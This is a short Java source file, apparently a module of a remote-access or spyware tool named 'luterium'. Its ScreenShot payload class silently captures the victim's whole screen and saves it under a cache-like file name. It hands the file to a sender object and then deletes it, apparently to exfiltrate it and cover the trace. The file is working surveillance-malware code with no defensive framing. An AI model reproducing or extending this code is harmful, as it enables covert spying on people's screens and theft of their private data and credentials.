package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Random;

public class ScreenShot implements PayloadExecutor {
    Main main = new Main();

    @Override
    public void execute() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File("cached_" + random + ".png");
        ImageIO.write(image, "png", file);
        main.theThing.send(file);
        file.delete();
    }
}
